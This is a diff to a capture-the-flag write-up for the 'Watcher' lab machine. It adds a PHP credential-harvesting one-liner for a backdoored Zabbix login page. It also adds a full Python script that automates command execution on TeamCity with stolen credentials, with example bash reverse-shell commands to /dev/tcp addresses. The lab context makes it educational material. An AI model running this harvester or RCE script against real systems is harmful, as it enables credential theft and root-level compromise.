@@ -3,15 +3,12 @@
 
 ##  Machine Summary
 
-We first find a Zabbix instance which is a vulnerable version where we can gain RCE via `CVE-2024-22120`. After gaining a shell we can backdoor the application to gain the credentials of another user `Frank`. With that user we can login to an internal `TeamCity` instance, that runs as `root`. Where we can create a pipeline to gain a reverse shell as `root`. 
+We first find a Zabbix instance which is a vulnerable version where we can gain RCE via `CVE-2024-22120`. After gaining a shell we can backdoor the application to gain the credentials of another user `Frank`. With that user we can login to an internal `TeamCity` instance, that runs as `root`. Where we can access the running agent on local port 9090 to open a terminal as root or create a pipeline to gain a reverse shell as `root`. 
 
 ## Recon
 
+### Nmap
 ```ad-summary
-title: NMAP
-collapse: open
-
-```nmap
 nmap -sC -sV -p- --min-rate 1000 10.10.92.19 -oA watcher  
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 20:02 CEST
@@ -31,13 +28,6 @@ PORT      STATE SERVICE    VERSION
 10050/tcp open  tcpwrapped
 10051/tcp open  tcpwrapped
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-```ad-important
-title: Domains
-collapse: open
-
-- **watcher.vl**
 ```
 
 ## Initial Access
@@ -106,7 +96,19 @@ Then we get a request to our server after a few minutes:
 We now have creds:
 - `Frank`:`REDACTED`
 
-We can now use those creds to access Teamcity. We now just need to create a pipeline giving us a shell:
+You can also use this oneliner to get the creds in a file like `.loot` in the same folder as `index.php`
+```
+file_put_contents(".loot", $_POST['name'] . ":" . $_POST['password'] . "\n", FILE_APPEND);
+```
+
+We can now use those creds to access Teamcity. 
+<br>
+There is a agent running. Just open the terminal on this one and you can run system commands as root. 
+
+![create-build-config](images/agent.png)
+
+The other way is creating a pipeline to get a shell.
+<br>
 Create a new project:
 ![new-project](images/new-project.png)
 ![create-project](images/create-project.png)
@@ -142,3 +144,152 @@ We can then read the flag from the root directory:
 (remote) root@watcher.vl:/root# cat root.txt 
 VL{REDACTED}
 ```
+
+All the steps can be automated. 
+<br>
+Authenticate -> Create: project, build config and build step -> Run build with the agent. 
+
+```python
+#!/usr/bin/python3
+import os
+import requests
+import random
+from bs4 import BeautifulSoup
+import argparse
+
+parser = argparse.ArgumentParser(description='RCE in TeamCity: Tested in TeamCity Professional 2024.03.3 (build 156364)')
+parser.add_argument('--url', required=True, help='http://localhost:8111',)
+parser.add_argument('--username', required=True, help='Name of the user',)
+parser.add_argument('--password', required=True, help='Password of the user',)
+parser.add_argument('--cmd', required=True, help="bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'",)
+args = parser.parse_args()
+
+S = requests.Session()
+headers = {
+    'Content-Type': 'application/json',
+    }
+n = random.randint(100,999)
+
+r = S.get(args.url+'/login.html')
+soup = BeautifulSoup(r.text, 'lxml')
+tc_csrf_token = soup.find('meta', {'name':'tc-csrf-token'})['content']
+public_key = soup.find('input', {'name':'publicKey'})['value']
+print(f'publickey: {public_key}')
+
+def login():
+    r = S.get(args.url+'/httpAuth/app/rest/server', auth=(args.username, args.password), headers=headers)
+    print(f'login() {r.status_code}')
+    print(f'Login with user {args.username}:{args.password}')
+    r = S.get(args.url+'/favorite/projects?mode=builds')
+    soup = BeautifulSoup(r.text, 'lxml')
+    tc_csrf_token = soup.find('input', {'name':'tc-csrf-token'})['value']
+    print(f'CSRF Token: {tc_csrf_token}')
+    return tc_csrf_token
+
+def create_project():
+    project = 'ProjectShell'+ str(n)
+    data = {
+        'parentId': '_Root',
+        'name': project,
+        'externalId': project,
+        'description': '',
+        'submitProject': 'store',
+        'submitCreateProject': 'Create',
+        'tc-csrf-token': tc_csrf_token,
+    }
+    r = S.post(args.url+'/admin/createProject.html', data=data)
+    print(f'reate_project() {r.status_code}')
+    print(f'Crate new Project: {project}')
+    return project
+
+def create_build_configuration():
+    build_config = project + '_BuildConfig'
+    data = {
+        'parentProjectId': project,
+        'buildTypeName': 'build_config',
+        'buildTypeExternalId': build_config,
+        'description': '',
+        '-ufd-teamcity-ui-buildConfigurationType': 'Regular',
+        'buildConfigurationType': 'REGULAR',
+        'createBuildType': 'Create',
+        'tc-csrf-token': tc_csrf_token,
+    }
+    r = S.post(args.url+'/admin/createBuildType.html', data=data)
+    print(f'create_build_configuration() {r.status_code}')
+    print(f'Create Build Configuration: {build_config}')
+    return build_config
+
+def create_build_step():
+    build_step = 'cmd_'+str(n)
+    data = {
+        "runTypeInfoKey":"simpleRunner",
+        "buildStepName":build_step,
+        "newRunnerId":build_step,
+        "prop:teamcity.step.phase":"",
+        "-ufd-teamcity-ui-prop:teamcity.step.mode":"If all previous steps finished successfully",
+        "prop:teamcity.step.mode":"default",
+        "condition[]":"",
+        "publicKey":public_key,
+        "prop:teamcity.build.workingDir":"",
+        "-ufd-teamcity-ui-prop:use.custom.script":"Custom script",
+        "prop:use.custom.script":True,
+        "prop:command.executable":"",
+        "prop:command.parameters":"",
+        "prop:script.content":args.cmd,
+        "wrapToggle":"",
+        "prop:log.stderr.as.errors":"",
+        "prop:plugin.docker.imageId":"",
+        "prop:plugin.docker.imagePlatform":"",
+        "-ufd-teamcity-ui-prop:plugin.docker.imagePlatform":"<Any>",
+        "prop:plugin.docker.run.parameters":"",
+        "showDSL=&showDSLVersion":"",
+        "showDSLPortable":"",
+        "submitButton":"Save",
+        "tc-csrf-token":tc_csrf_token,
+        "numberOfSettingsChangesEvents":3       
+    }
+    
+    r = S.post(args.url+f'/admin/editRunType.html?id=buildType:{build_config}&runnerId=__NEW_RUNNER__&submitBuildType=store', data=data)
+    print(f'create_build_step() {r.status_code}')
+    print(f'New Build Step: Command Line: {build_step}')
+    return build_step
+
+def run_build():
+    data = {
+        "buildTypeId":build_config,
+        "redirectTo":"",
+        "stateKey":"",
+        "dependOnPromotionIds":"",
+        "customBuildDialog":True,
+        "forceAutoGeneratedBranch":"",
+        "personalPatchUploaded":"",
+        "-ufd-teamcity-ui-agentId":"<the fastest idle agent>",
+        "agentId":"",
+        "_personal":"",
+        "file%3ApersonalPatch":"",
+        "uploadPatch":True,
+        "buildTypeId":build_config,
+        "stateKey":"",
+        "tc-csrf-token":tc_csrf_token,
+        "_moveToTop":"",
+        "_cleanSources":"",
+        "ring-radio-0-7zy2":"ASAP",
+        "buildComment":"",
+        "buildTagsInfo":"",
+        "_applyToChainBuilds":"",
+        "addToFavorite":True,
+        "_addToFavorite":""
+    }
+    r = S.post(args.url+'/runCustomBuild.html', data=data)
+    print(f'run_build() {r.status_code}')
+    print(f'Run Build...')
+
+tc_csrf_token = login()
+project = create_project()
+build_config = create_build_configuration()
+build_step = create_build_step()
+run_build()
+```
+
+Comamnd to run the script:
+* `./teamcity_rce.py --url http://localhost:8111 --username Frank --password 'REDACTED' --cmd "bash -c 'bash -i >& /dev/tcp/REDACTED/9002 0>&1'"`
